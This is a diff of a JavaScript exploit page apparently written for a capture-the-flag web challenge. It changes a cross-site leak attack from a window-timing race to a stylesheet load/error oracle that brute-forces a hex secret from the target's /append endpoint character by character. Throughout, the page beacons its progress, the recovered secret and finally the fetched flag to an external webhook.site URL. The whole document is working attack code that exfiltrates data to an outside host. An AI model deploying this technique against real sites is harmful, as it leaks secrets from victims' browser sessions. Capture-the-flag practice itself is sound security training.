@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Race</title></head>
+<head><title>XS-Leak Link</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -8,7 +8,7 @@ var TARGET = "https://append-note-hfskv.instancer.lac.tf";
 var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
 var CHARS = "0123456789abcdef";
 
-navigator.sendBeacon(WEBHOOK, "RACE_V2");
+navigator.sendBeacon(WEBHOOK, "LINK_V1");
 
 function report(d) {
     navigator.sendBeacon(WEBHOOK, d);
@@ -16,98 +16,95 @@ function report(d) {
 }
 function setStatus(s) { document.getElementById('s').textContent = s; }
 
-// Race all chars simultaneously using form.submit to named windows
-function racePosition(prefix) {
+// Test using link stylesheet - 200 vs 404 might have different load/error behavior
+function testChar(prefix, c) {
     return new Promise(function(resolve) {
-        var finished = [];
-        var done = 0;
-        var total = CHARS.length;
-        var windows = [];
-        var intervals = [];
+        var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/");
         
-        for (var i = 0; i < total; i++) {
-            (function(c, idx) {
-                var wname = 'w' + idx + '_' + Date.now();
-                
-                var form = document.createElement('form');
-                form.method = 'GET';
-                form.action = TARGET + '/append?content=' + encodeURIComponent(prefix + c) + '&url=' + encodeURIComponent(TARGET + '/');
-                form.target = wname;
-                form.style.display = 'none';
-                document.body.appendChild(form);
-                
-                var startTime = performance.now();
-                form.submit();
-                document.body.removeChild(form);
-                
-                // Get window reference
-                var w = window.open('', wname);
-                windows.push({ w: w, c: c });
-                
-                // Poll for completion
-                var interval = setInterval(function() {
-                    try {
-                        // Access check - cross-origin throws
-                        var loc = w.location.href;
-                    } catch(e) {
-                        // Loaded and redirected
-                        clearInterval(interval);
-                        var elapsed = performance.now() - startTime;
-                        finished.push({ c: c, time: elapsed, order: finished.length });
-                        done++;
-                        try { w.close(); } catch(x) {}
-                        if (done >= total) resolve(finished);
-                    }
-                }, 3);
-                intervals.push(interval);
-                
-            })(CHARS[i], i);
-        }
+        var link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = url;
         
-        // Timeout fallback
-        setTimeout(function() {
-            for (var i = 0; i < intervals.length; i++) clearInterval(intervals[i]);
-            for (var i = 0; i < windows.length; i++) {
-                try { windows[i].w.close(); } catch(e) {}
+        var start = performance.now();
+        var resolved = false;
+        
+        link.onload = function() {
+            if (!resolved) {
+                resolved = true;
+                var elapsed = performance.now() - start;
+                document.head.removeChild(link);
+                resolve({ c: c, status: 'load', time: elapsed });
             }
-            if (done < total) {
-                // Fill remaining
-                for (var i = 0; i < total; i++) {
-                    var c = CHARS[i];
-                    var found = finished.some(function(f) { return f.c === c; });
-                    if (!found) finished.push({ c: c, time: 9999, order: finished.length });
-                }
-                resolve(finished);
+        };
+        
+        link.onerror = function() {
+            if (!resolved) {
+                resolved = true;
+                var elapsed = performance.now() - start;
+                try { document.head.removeChild(link); } catch(e) {}
+                resolve({ c: c, status: 'error', time: elapsed });
+            }
+        };
+        
+        document.head.appendChild(link);
+        
+        // Timeout
+        setTimeout(function() {
+            if (!resolved) {
+                resolved = true;
+                try { document.head.removeChild(link); } catch(e) {}
+                resolve({ c: c, status: 'timeout', time: 5000 });
             }
         }, 5000);
     });
 }
 
+// Test all 16 chars in parallel
+function testPosition(prefix) {
+    var promises = [];
+    for (var i = 0; i < CHARS.length; i++) {
+        promises.push(testChar(prefix, CHARS[i]));
+    }
+    return Promise.all(promises);
+}
+
 async function main() {
     report('START');
-    setStatus('Racing...');
+    setStatus('Testing...');
     
     try {
         var secret = "";
         
         for (var p = 0; p < 8; p++) {
             setStatus('P' + p + '...');
-            var results = await racePosition(secret);
+            var results = await testPosition(secret);
             
-            // Sort by order (first to finish)
-            results.sort(function(a,b) { return a.order - b.order; });
+            // Count load vs error
+            var loads = results.filter(function(r) { return r.status === 'load'; });
+            var errors = results.filter(function(r) { return r.status === 'error'; });
             
-            // Report top 3
-            var top3 = results.slice(0, 3).map(function(r) { return r.c + ':' + Math.round(r.time); }).join(',');
-            report('P' + p + ':' + top3);
+            report('P' + p + ':L=' + loads.length + ',E=' + errors.length);
             
-            // Take first to finish
-            secret += results[0].c;
+            // Report details
+            var detail = results.map(function(r) { return r.c + ':' + r.status[0]; }).join('');
+            report('P' + p + 'D:' + detail);
+            
+            // If one is different from majority, that's the answer
+            if (loads.length === 1) {
+                secret += loads[0].c;
+            } else if (errors.length === 1) {
+                secret += errors[0].c;
+            } else {
+                // Fallback to timing
+                results.sort(function(a,b) { return a.time - b.time; });
+                secret += results[0].c;
+            }
+            
+            report('P' + p + '=' + secret);
         }
         
         report('SEC:' + secret);
         
-        // Try to get flag
         var resp = await fetch(TARGET + '/flag?secret=' + secret);
         var flag = await resp.text();
         report('FLAG:' + flag);
